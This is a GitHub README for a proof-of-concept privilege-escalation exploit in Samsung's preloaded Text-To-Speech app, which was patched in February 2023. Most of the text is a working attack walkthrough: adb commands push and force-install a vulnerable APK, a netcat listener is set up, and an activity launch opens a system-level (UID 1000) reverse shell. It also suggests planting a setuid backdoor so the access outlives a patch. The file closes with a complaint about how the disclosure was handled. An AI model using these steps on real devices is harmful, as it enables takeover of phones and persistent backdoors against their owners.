# K0mraid3s_System_Shell-Source
 Source code for K0mraid3s 2023 System Shell PoC
As seen on XDA before the public disclousure was removed by XDA Moderators. Patched as of 02/2023

If you just need this prebuilt, see this repo https://github.com/k0mraid3/K0mraid3s-System-Shell

This PoC Should point at localhost port 9997, so nc -lp 9997 into it once built. 

Step 1 - Install the included "komraids_POC_V1.6.apk" to the device, then push the included "samsungTTSVULN2.apk" to /data/local/tmp (adb push samsungTTSVULN2.apk /data/local/tmp) -> Chmod 777 /data/local/tmp/samsungTTSVULN2.apk >>> I advice disabling all battery optimizations for Samsung TTS and Shell, otherwise, it cuts off the shell from time to time.

Step 2 - Make sure ADB is on, Connected and authorized and all power saving is off (as mentioned above) Reboot device.

Step 4 - When device reboots, run this command from ADB. adb shell pm install -r -d -f -g --full --install-reason 3 --enable-rollback /data/local/tmp/samsungTTSVULN2.apk ---> it will return "Success" when done.

Step 5 - Now, open two shells, in the first, do nc -lp 9997 & in the second, do am start -n com.samsung.SMT/.gui.DownloadList -> Look back at the first shell., it should have opened into a new system (UID 1000) shell.

Some things to note: We can use localhost or staric IP, this basically uses a trick with the libmstring and netcat to open a reverse shell in the context of Samsung Text-To-Speech, a preloaded system app on all samsung mobile devices. Once as system, we could find a dir/make a dir somewhere, with a script to get back in, chmod a+s and make a backdoor to outlive a patch of this too...

Its hit or miss, this thing has a personality of its own sometimes in the  sense it will work, or it wont, just keep trying to nc -lp into the shell, its there.

About this project:
Its full or drama and BS. I reported this to Samsung in October 2022, but they have decided this is GOOGLES problem and forgot to tell me their decision. LONG STORY CUT SHORT, Between the time Samsung decided this was GOOGLES problem and them telling me of that decision, somehow, "another external security researcher" reported this exact thing to google in the context it was their find. IDK who, nor do I really care at this point. Its done and over with, but stuff like this is what makes some security researches ever hesitant to share their finds, even with the shady vendors/OEMS.
